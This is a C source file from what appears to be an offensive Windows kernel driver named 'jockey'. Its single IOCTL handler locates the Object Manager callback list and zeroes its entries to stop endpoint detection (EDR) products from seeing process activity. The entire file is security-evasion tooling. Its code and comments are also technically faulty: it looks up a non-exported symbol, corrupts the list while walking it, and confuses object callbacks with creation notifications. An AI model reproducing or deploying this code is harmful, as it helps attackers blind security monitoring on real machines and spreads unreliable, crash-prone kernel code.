#include "jockey_common.h"

/*
 * jockey_obcb.c ??? Object Manager Callback removal.
 *
 * Removes ObRegisterCallbacks from ObpCallbackList,
 * preventing EDR from seeing process/image/thread creation.
 */

#include "jockey.h"

/*
 * jockey_ioctl_disable_ob_callbacks:
 *   Walks ObpCallbackList and unlinks callback entries.
 *   This disables EDR process creation notifications.
 */
NTSTATUS jockey_ioctl_disable_ob_callbacks(PIRP irp, ULONG in_len, ULONG out_len)
{
    PLIST_ENTRY head, entry, next;
    uint32_t *out;

    UNREFERENCED_PARAMETER(in_len);
    UNREFERENCED_PARAMETER(out_len);

    /*
     * ObpCallbackList is a global LIST_ENTRY head.
     * We walk it and unlink callbacks that aren't ours,
     * or just zero the entire list.
     */
    {
        UNICODE_STRING name;
        PVOID addr;

        RtlInitUnicodeString(&name, L"ObpCallbackList");
        addr = MmGetSystemRoutineAddress(&name);
        if (addr) {
            head = (PLIST_ENTRY)addr;

            entry = head->Flink;
            while (entry != head) {
                next = entry->Flink;

                /*
                 * Each entry is an OB_CALLBACK_ENTRY which contains
                 * a LIST_ENTRY for the callback list.
                 * We zero the callback registration block.
                 */
                RtlZeroMemory(entry, sizeof(LIST_ENTRY));
                entry = next;
            }

            DbgPrint("[jockey] Removed ObpCallbackList entries\n");
        }
    }

    out = (uint32_t *)irp->AssociatedIrp.SystemBuffer;
    *out = 1;
    irp->IoStatus.Information = sizeof(uint32_t);
    return STATUS_SUCCESS;
}

